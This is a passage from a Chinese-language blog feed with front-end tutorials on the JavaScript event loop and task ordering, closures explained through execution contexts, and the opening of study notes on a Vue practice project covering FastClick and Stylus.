        <content type="html"><![CDATA[<blockquote><p>众所周知，JavaScript是一门单线程语言，但这并不意味着JavaScript会逐行执行，因为JS中有诸如 <code>setTimeout</code> , <code>Promise</code> 这类语法的存在，所以JS得执行顺序便变得扑朔迷离起来，本文就从JS的执行机制一起来探究JS的执行顺序。</p></blockquote><a id="more"></a><h2 id="同步和异步"><a href="#同步和异步" class="headerlink" title="同步和异步"></a>同步和异步</h2><p>因为JavaScript时单线程语言，所以JS的任务需要一个个顺序执行。但当我们的页面需要请求文件、图片等耗时较久的操作时，显然一个个执行，将影响页面的渲染和用户体验，所以我们提出了两个概念：<code>同步任务</code> 和 <code>异步任务</code> 。</p><h3 id="同步任务"><a href="#同步任务" class="headerlink" title="同步任务"></a>同步任务</h3><p>定义：如果在函数A返回的时候，调用者就能够得到预期结果(即拿到了预期的返回值或者看到了预期的效果)，那么这个函数就是同步的。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">console.log(&quot;Hi&quot;);</span><br></pre></td></tr></table></figure></p><h3 id="异步任务"><a href="#异步任务" class="headerlink" title="异步任务"></a>异步任务</h3><p>定义：如果在函数A返回的时候，调用者还不能够得到预期结果，而是需要在将来通过一定的手段得到，那么这个函数就是异步的。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">fs.readFile(&apos;foo.txt&apos;, &apos;utf8&apos;, function(err, data) &#123;</span><br><span class="line">  console.log(data);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p><h2 id="事件循环"><a href="#事件循环" class="headerlink" title="事件循环"></a>事件循环</h2><p>在我们了解了同步任务和异步任务后，我们来看看他们具体是如何执行的。<br><img src="../assets/20191007/1.jpg" alt="Alt text"></p><ul><li>同步和异步任务分别进入不同的执行”场所”，同步的进入主线程，异步的进入Event Table并注册函数。</li><li>当指定的事情完成时，Event Table会将这个函数移入Event Queue。</li><li>主线程内的任务执行完毕为空，会去Event Queue读取对应的函数，进入主线程执行。</li><li>上述过程会不断重复，也就是常说的Event Loop(事件循环)。</li></ul><p>js引擎存在monitoring process进程，会持续不断的检查主线程执行栈是否为空，一旦为空，就会去Event Queue那里检查是否有等待被调用的函数。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">let data = [];</span><br><span class="line">$.ajax(&#123;</span><br><span class="line">    url:www.javascript.com,</span><br><span class="line">    data:data,</span><br><span class="line">    success:() =&gt; &#123;</span><br><span class="line">        console.log(&apos;发送成功!&apos;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line">console.log(&apos;代码执行结束&apos;);</span><br></pre></td></tr></table></figure></p><ul><li>ajax进入Event Table，注册回调函数success。</li><li>执行console.log(‘代码执行结束’)。</li><li>ajax事件完成，回调函数success进入Event Queue。</li><li>主线程从Event Queue读取回调函数success并执行。</li></ul><h2 id="setTimeout"><a href="#setTimeout" class="headerlink" title="setTimeout"></a>setTimeout</h2><p>setTimeout 函数常用于延时执行。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">setTimeout(() =&gt; &#123;</span><br><span class="line">    task();</span><br><span class="line">&#125;,3000)</span><br><span class="line">console.log(&apos;执行console&apos;);</span><br><span class="line"></span><br><span class="line">//执行console</span><br><span class="line">//3秒后，执行task()</span><br></pre></td></tr></table></figure></p><p>而有时候，setTimeout 的延时时间会超出我们设定的时间，这是因为JS的同步任务可能占用了大量时间，setTimeout 得等到同步任务执行完毕后才能执行。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">setTimeout(() =&gt; &#123;</span><br><span class="line">    task()</span><br><span class="line">&#125;,3000)</span><br><span class="line"></span><br><span class="line">sleep(10000000);</span><br></pre></td></tr></table></figure></p><ul><li>task()进入Event Table并注册,计时开始。</li><li>执行sleep函数，很慢，非常慢，计时仍在继续。</li><li>3秒到了，计时事件timeout完成，task()进入Event Queue，但是sleep也太慢了吧，还没执行完，只好等着。</li><li>sleep终于执行完了，task()终于从Event Queue进入了主线程执行。</li></ul><p>所以由上可知， <code>setTimeout(fn,0)</code> 的含义是指定某个任务在主线程最早可得的空闲时间执行。</p><h2 id="setInterval"><a href="#setInterval" class="headerlink" title="setInterval"></a>setInterval</h2><ul><li>setInterval 与 setTimeout 相近，setInterval 会每隔指定的时间将注册的函数置入Event Queue，如果前面的任务耗时太久，同样需要等待。</li><li>对于setInterval(fn,ms)来说，我们已经知道不是每过ms秒会执行一次fn，而是每过ms秒，会有fn进入Event Queue。一旦setInterval的回调函数fn执行时间超过了延迟时间ms，那么就完全看不出来有时间间隔了。</li></ul><h2 id="process-nextTick-callback"><a href="#process-nextTick-callback" class="headerlink" title="process.nextTick(callback)"></a>process.nextTick(callback)</h2><p>process.nextTick(callback)类似node.js版的”setTimeout”，在事件循环的下一次循环中调用 callback 回调函数。</p><h2 id="宏任务和微任务"><a href="#宏任务和微任务" class="headerlink" title="宏任务和微任务"></a>宏任务和微任务</h2><p>除了广义的同步任务和异步任务，我们对任务有更精细的定义：</p><ul><li>macro-task(宏任务)：包括整体代码script，setTimeout，setInterval</li><li>micro-task(微任务)：Promise，process.nextTick</li></ul><p>不同类型的任务会进入对应的Event Queue，比如setTimeout和setInterval会进入相同的Event Queue。</p><p>事件循环的顺序，决定js代码的执行顺序。进入整体代码(宏任务)后，开始第一次循环。接着执行所有的微任务。然后再次从宏任务开始，找到其中一个任务队列执行完毕，再执行所有的微任务。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">setTimeout(function() &#123;</span><br><span class="line">    console.log(&apos;setTimeout&apos;);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">new Promise(function(resolve) &#123;</span><br><span class="line">    console.log(&apos;promise&apos;);</span><br><span class="line">&#125;).then(function() &#123;</span><br><span class="line">    console.log(&apos;then&apos;);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">console.log(&apos;console&apos;);</span><br></pre></td></tr></table></figure><ul><li>这段代码作为宏任务，进入主线程。</li><li>先遇到setTimeout，那么将其回调函数注册后分发到宏任务Event Queue。(注册过程与上同，下文不再描述)</li><li>接下来遇到了Promise，new Promise立即执行，then函数分发到微任务Event Queue。</li><li>遇到console.log()，立即执行。</li><li>整体代码script作为第一个宏任务执行结束，看看有哪些微任务？我们发现了then在微任务Event Queue里面，执行。</li><li>第一轮事件循环结束了，我们开始第二轮循环，当然要从宏任务Event Queue开始。我们发现了宏任务Event Queue中setTimeout对应的回调函数，立即执行。</li><li>结束。</li></ul><p><img src="../assets/20191007/2.jpg" alt="Alt text"></p><h2 id="复杂案例"><a href="#复杂案例" class="headerlink" title="复杂案例"></a>复杂案例</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">console.log(&apos;1&apos;);</span><br><span class="line"></span><br><span class="line">setTimeout(function() &#123;</span><br><span class="line">    console.log(&apos;2&apos;);</span><br><span class="line">    process.nextTick(function() &#123;</span><br><span class="line">        console.log(&apos;3&apos;);</span><br><span class="line">    &#125;)</span><br><span class="line">    new Promise(function(resolve) &#123;</span><br><span class="line">        console.log(&apos;4&apos;);</span><br><span class="line">        resolve();</span><br><span class="line">    &#125;).then(function() &#123;</span><br><span class="line">        console.log(&apos;5&apos;)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br><span class="line">process.nextTick(function() &#123;</span><br><span class="line">    console.log(&apos;6&apos;);</span><br><span class="line">&#125;)</span><br><span class="line">new Promise(function(resolve) &#123;</span><br><span class="line">    console.log(&apos;7&apos;);</span><br><span class="line">    resolve();</span><br><span class="line">&#125;).then(function() &#123;</span><br><span class="line">    console.log(&apos;8&apos;)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">setTimeout(function() &#123;</span><br><span class="line">    console.log(&apos;9&apos;);</span><br><span class="line">    process.nextTick(function() &#123;</span><br><span class="line">        console.log(&apos;10&apos;);</span><br><span class="line">    &#125;)</span><br><span class="line">    new Promise(function(resolve) &#123;</span><br><span class="line">        console.log(&apos;11&apos;);</span><br><span class="line">        resolve();</span><br><span class="line">    &#125;).then(function() &#123;</span><br><span class="line">        console.log(&apos;12&apos;)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>第一轮事件循环流程分析如下：</p><ul><li>整体script作为第一个宏任务进入主线程，遇到console.log，输出1。</li><li>遇到setTimeout，其回调函数被分发到宏任务Event Queue中。我们暂且记为setTimeout1。</li><li>遇到process.nextTick()，其回调函数被分发到微任务Event Queue中。我们记为process1。</li><li>遇到Promise，new Promise直接执行，输出7。then被分发到微任务Event Queue中。我们记为then1。</li><li>又遇到了setTimeout，其回调函数被分发到宏任务Event Queue中，我们记为setTimeout2。</li></ul><table><thead><tr><th style="text-align:center">宏任务Event Queue</th><th style="text-align:center">微任务Event Queue</th></tr></thead><tbody><tr><td style="text-align:center">setTimeout1</td><td style="text-align:center">process1</td></tr><tr><td style="text-align:center">setTimeout2</td><td style="text-align:center">then1</td></tr></tbody></table><ul><li>上表是第一轮事件循环宏任务结束时各Event Queue的情况，此时已经输出了1和7。</li><li>我们发现了process1和then1两个微任务。</li><li>执行process1,输出6。</li><li>执行then1，输出8。</li></ul><p>第二轮时间循环从setTimeout1宏任务开始：</p><ul><li>首先输出2。接下来遇到了process.nextTick()，同样将其分发到微任务Event Queue中，记为process2。new Promise立即执行输出4，then也分发到微任务Event Queue中，记为then2。</li></ul><table><thead><tr><th style="text-align:center">宏任务Event Queue</th><th style="text-align:center">微任务Event Queue</th></tr></thead><tbody><tr><td style="text-align:center">setTimeout2</td><td style="text-align:center">process2</td></tr><tr><td style="text-align:center"></td><td style="text-align:center">then2</td></tr></tbody></table><ul><li>第二轮事件循环宏任务结束，我们发现有process2和then2两个微任务可以执行。</li><li>输出3。</li><li>输出5。</li><li>第二轮事件循环结束，第二轮输出2，4，3，5。</li></ul><p>第三轮事件循环开始，此时只剩setTimeout2了，执行。</p><ul><li>直接输出9。</li><li>将process.nextTick()分发到微任务Event Queue中。记为process3。</li><li>直接执行new Promise，输出11。</li><li>将then分发到微任务Event Queue中，记为then3。</li></ul><table><thead><tr><th style="text-align:center">宏任务Event Queue</th><th style="text-align:center">微任务Event Queue</th></tr></thead><tbody><tr><td style="text-align:center"></td><td style="text-align:center">process3</td></tr><tr><td style="text-align:center"></td><td style="text-align:center">then3</td></tr></tbody></table><ul><li>第三轮事件循环宏任务执行结束，执行两个微任务process3和then3。</li><li>输出10。</li><li>输出12。</li><li>第三轮事件循环结束，第三轮输出9，11，10，12。</li></ul><p>整段代码，共进行了三次事件循环，完整的输出为1，7，6，8，2，4，3，5，9，11，10，12。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>以上就是JavaScript的执行机制，最后在强调一下JavaScript的两个基本特征。</p><ul><li>javascript是一门单线程语言</li><li>Event Loop是javascript的执行机制</li></ul><blockquote><p>参考链接：<a href="https://juejin.im/post/59e85eebf265da430d571f89" target="_blank" rel="noopener">这一次，彻底弄懂 JavaScript 执行机制（ssssyoki）</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端 </tag>
            
            <tag> JS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>从执行上下文深入理解闭包</title>
      <link href="/%E4%BB%8E%E6%89%A7%E8%A1%8C%E4%B8%8A%E4%B8%8B%E6%96%87%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E9%97%AD%E5%8C%85.html"/>
      <url>/%E4%BB%8E%E6%89%A7%E8%A1%8C%E4%B8%8A%E4%B8%8B%E6%96%87%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E9%97%AD%E5%8C%85.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>在学习前端的道路上，对很多知识点我们大多时候都是知其然而不知其所以然，当我们钻牛角尖去研究那些底层原理的时候，我们又容易迷失方向，不禁发出灵魂的拷问——“这个知识究竟有什么用处”，在拜读了某位大佬JS深入学习系列的专题文章后，我不由想要从其底层原理来讲讲闭包的实现过程，以此对闭包有更深入的理解。</p></blockquote><a id="more"></a><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">var scope = &quot;global scope&quot;;</span><br><span class="line">function checkscope()&#123;</span><br><span class="line">    var scope = &quot;local scope&quot;;</span><br><span class="line">    function f()&#123;</span><br><span class="line">      return scope;</span><br><span class="line">    &#125;</span><br><span class="line">    return f;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var foo = checkscope();</span><br><span class="line">foo();</span><br></pre></td></tr></table></figure><p>首先，我们以上面这段代码，来看下其执行上下文的构建过程。</p><h2 id="执行上下文构建过程"><a href="#执行上下文构建过程" class="headerlink" title="执行上下文构建过程"></a>执行上下文构建过程</h2><p>执行全局代码，创建全局执行上下文，全局上下文被压入执行上下文栈。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ECStack = [</span><br><span class="line">  globalContext</span><br><span class="line">];</span><br></pre></td></tr></table></figure></p><p>全局上下文初始化。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">globalContext = &#123;</span><br><span class="line">  VO: [global, scope, checkscope, foo],</span><br><span class="line">  Scope: [globalContext.VO],</span><br><span class="line">  this: globalContext.VO</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>初始化的同时，checkscope 函数被创建，保存作用域链到函数的内部属性[[scope]]。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">checkscope.[[scope]] = [</span><br><span class="line">  globalContext.VO</span><br><span class="line">];</span><br></pre></td></tr></table></figure></p><p>执行 checkscope 函数，创建 checkscope 函数执行上下文，checkscope 函数执行上下文被压入执行上下文栈。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ECStack = [</span><br><span class="line">  checkscopeContext,</span><br><span class="line">  globalContext</span><br><span class="line">];</span><br></pre></td></tr></table></figure></p><p>checkscope 函数执行上下文初始化：</p><ul><li>复制函数 [[scope]] 属性创建作用域链，</li><li>用 arguments 创建活动对象，</li><li>初始化活动对象，即加入形参、函数声明、变量声明，</li><li>将活动对象压入 checkscope 作用域链顶端。</li><li>f 函数被创建，保存作用域链到 f 函数的内部属性[[scope]]</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">checkscopeContext = &#123;</span><br><span class="line">  AO: &#123;</span><br><span class="line">    arguments: &#123;</span><br><span class="line">      length: 0</span><br><span class="line">    &#125;,</span><br><span class="line">    scope: undefined,</span><br><span class="line">    f: reference to function f()&#123;&#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  Scope: [AO, globalContext.VO],</span><br><span class="line">  this: undefined</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>checkscope 函数执行完毕，checkscope 执行上下文从执行上下文栈中弹出<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ECStack = [</span><br><span class="line">  globalContext</span><br><span class="line">];</span><br></pre></td></tr></table></figure></p><p>执行 f 函数，创建 f 函数执行上下文，f 执行上下文被压入执行上下文栈。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ECStack = [</span><br><span class="line">  fContext,</span><br><span class="line">  globalContext</span><br><span class="line">];</span><br></pre></td></tr></table></figure></p><p>f 函数执行上下文初始化, 以下跟第 4 步相同：</p><ul><li>复制函数 [[scope]] 属性创建作用域链</li><li>用 arguments 创建活动对象</li><li>初始化活动对象，即加入形参、函数声明、变量声明</li><li>将活动对象压入 f 作用域链顶端</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">fContext = &#123;</span><br><span class="line">  AO: &#123;</span><br><span class="line">    arguments: &#123;</span><br><span class="line">      length: 0</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  Scope: [AO, checkscopeContext.AO, globalContext.VO],</span><br><span class="line">  this: undefined</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>f 函数执行，沿着作用域链查找 scope 值，返回 scope 值。<br>f 函数执行完毕，f 函数上下文从执行上下文栈中弹出。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ECStack = [</span><br><span class="line">  globalContext</span><br><span class="line">];</span><br></pre></td></tr></table></figure></p><h2 id="闭包的定义"><a href="#闭包的定义" class="headerlink" title="闭包的定义"></a>闭包的定义</h2><p>现在我们再来看看 ECMAScript 中对闭包的定义。</p><h3 id="理论角度"><a href="#理论角度" class="headerlink" title="理论角度"></a>理论角度</h3><p>所有的函数。因为它们都在创建的时候就将上层上下文的数据保存起来了。哪怕是简单的全局变量也是如此，因为函数中访问全局变量就相当于是在访问自由变量，这个时候使用最外层的作用域。</p><h3 id="实践角度"><a href="#实践角度" class="headerlink" title="实践角度"></a>实践角度</h3><p>以下函数才算是闭包：</p><ul><li>即使创建它的上下文已经销毁，它仍然存在（比如，内部函数从父函数中返回）。</li><li>在代码中引用了自由变量。</li></ul><p>所以可见 f 的执行上下文维护了一个作用域链。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">fContext = &#123;</span><br><span class="line">    Scope: [AO, checkscopeContext.AO, globalContext.VO]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>在 checkscopeContext 被销毁的情况下，该作用域链依旧被保存了下来，形成了闭包。</p><h2 id="经典闭包例子分析"><a href="#经典闭包例子分析" class="headerlink" title="经典闭包例子分析"></a>经典闭包例子分析</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">var data = [];</span><br><span class="line"></span><br><span class="line">for (var i = 0; i &lt; 3; i++) &#123;</span><br><span class="line">  data[i] = function () &#123;</span><br><span class="line">    console.log(i);</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">data[0]();  //3</span><br><span class="line">data[1]();  //3</span><br><span class="line">data[2]();  //3</span><br></pre></td></tr></table></figure><p>当执行到 data[0] 函数之前，此时全局上下文的 VO 为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">globalContext = &#123;</span><br><span class="line">  VO: &#123;</span><br><span class="line">    data: [...],</span><br><span class="line">    i: 3</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>当执行 data[0] 函数的时候，data[0] 函数的作用域链为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">data[0]Context = &#123;</span><br><span class="line">  Scope: [AO, globalContext.VO]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>data[0]Context 的 AO 并没有 i 值，所以会从 globalContext.VO 中查找，i 为 3，所以打印的结果就是 3。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">var data = [];</span><br><span class="line"></span><br><span class="line">for (var i = 0; i &lt; 3; i++) &#123;</span><br><span class="line">  data[i] = (function (i) &#123;</span><br><span class="line">    return function()&#123;</span><br><span class="line">        console.log(i);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)(i);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">data[0]();  //0</span><br><span class="line">data[1]();  //1</span><br><span class="line">data[2]();  //2</span><br></pre></td></tr></table></figure><p>当执行到 data[0] 函数之前，此时全局上下文的 VO 为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">globalContext = &#123;</span><br><span class="line">  VO: &#123;</span><br><span class="line">    data: [...],</span><br><span class="line">    i: 3</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>当执行 data[0] 函数的时候，data[0] 函数的作用域链发生了改变：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">data[0]Context = &#123;</span><br><span class="line">  Scope: [AO, 匿名函数Context.AO globalContext.VO]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>匿名函数执行上下文的 AO 为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">匿名函数Context = &#123;</span><br><span class="line">  AO: &#123;</span><br><span class="line">    arguments: &#123;</span><br><span class="line">      0: 0,</span><br><span class="line">      length: 1</span><br><span class="line">    &#125;,</span><br><span class="line">    i: 0</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>data[0]Context 的 AO 并没有 i 值，所以会沿着作用域链从匿名函数 Context.AO 中查找，这时候就会找 i 为 0，找到了就不会往 globalContext.VO 中查找了，即使 globalContext.VO 也有 i 的值(值为3)，所以打印的结果就是 0。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>以上就是对闭包的理解，那么学会了闭包，对我们的日常开发有什么用处呢，闭包在实际应用中最多的，就是用来实现函数柯里化，有关函数柯里化的知识可以参考我的另一篇文章<a href="http://dangoying.ink/%E5%87%BD%E6%95%B0%E6%9F%AF%E9%87%8C%E5%8C%96.html">函数柯里化</a></p><blockquote><p>参考链接：<a href="https://juejin.im/post/590159d8a22b9d0065c2d918" target="_blank" rel="noopener">JavaScript深入系列15篇（冴羽）</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vue去哪儿项目学习笔记</title>
      <link href="/vue%E5%8E%BB%E5%93%AA%E5%84%BF%E9%A1%B9%E7%9B%AE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.html"/>
      <url>/vue%E5%8E%BB%E5%93%AA%E5%84%BF%E9%A1%B9%E7%9B%AE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>借着每天零碎的时间，终于跟着某课网的视频完成了vue仿去哪儿的小项目，通过这个项目的练手，对vue和组件化开发有了更深入的理解，本文就来梳理下整个项目开发中那些值得思考和学习的知识。</p></blockquote><a id="more"></a><h2 id="项目启动流程"><a href="#项目启动流程" class="headerlink" title="项目启动流程"></a>项目启动流程</h2><p><img src="../assets/20190916/vue-start.jpg" alt="Alt text"></p><h2 id="多页应用-vs-单页应用"><a href="#多页应用-vs-单页应用" class="headerlink" title="多页应用 vs 单页应用"></a>多页应用 vs 单页应用</h2><h3 id="多页应用"><a href="#多页应用" class="headerlink" title="多页应用"></a>多页应用</h3><ul><li>解释：页面跳转，返回一个新的HTML文件</li><li>优点：首屏时间快，SEO效果好</li><li>缺点：页面切换慢</li></ul><h3 id="单页应用"><a href="#单页应用" class="headerlink" title="单页应用"></a>单页应用</h3><ul><li>解释：页面跳转，通过JS动态删除页面内容，再重新渲染</li><li>优点：页面切换快</li><li>缺点：首屏时间慢，SEO差</li></ul><h2 id="Fast-Click"><a href="#Fast-Click" class="headerlink" title="Fast Click "></a>Fast Click </h2><h3 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h3><p>解决移动端点击300ms延迟的问题。</p><h3 id="产生原因"><a href="#产生原因" class="headerlink" title="产生原因"></a>产生原因</h3><p>移动浏览器上支持的双击缩放操作，以及IOS Safari 上的双击滚动操作，是导致300ms的点击延迟主要原因。</p><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>FastClick的实现原理是在检测到touchend事件的时候，会通过DOM自定义事件立即出发模拟一个click事件，并把浏览器在300ms之后真正的click事件阻止掉。</p><h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">npm install fastclick --save</span><br><span class="line"></span><br><span class="line">//main.js</span><br><span class="line">import fastClick from &apos;fastclisk&apos;</span><br><span class="line">fastClick.attach(document.body)</span><br></pre></td></tr></table></figure><h3 id="不需要使用FastClick的情况"><a href="#不需要使用FastClick的情况" class="headerlink" title="不需要使用FastClick的情况"></a>不需要使用FastClick的情况</h3><ul><li>FastClick是不会对PC浏览器添加监听事件</li><li>Android版Chrome 32+浏览器，如果设置viewport meta的值为<code>width=device-width</code>，这种情况下浏览器会马上出发点击事件，不会延迟300毫秒。</li><li>所有版本的Android Chrome浏览器，如果设置viewport meta的值有user-scalable=no，浏览器也是会马上出发点击事件。</li><li>IE11+浏览器设置了css的属性<code>touch-action: manipulation</code>，它会在某些标签（a，button等）禁止双击事件，IE10的为-ms-touch-action: manipulation</li></ul><h2 id="Stylus-依赖包"><a href="#Stylus-依赖包" class="headerlink" title="Stylus 依赖包 "></a>Stylus 依赖包 </h2><h3 id="使用方式"><a href="#使用方式" class="headerlink" title="使用方式"></a>使用方式</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">npm install stylus --save</span><br><span class="line">npm install stylus-loader --save</span><br><span class="line"></span><br><span class="line">&lt;style lang=&quot;stylus&quot; scoped&gt;&lt;/style&gt;</span><br></pre></td></tr></table></figure><h3 id="优点"><a href="#优点" class="headerlink" 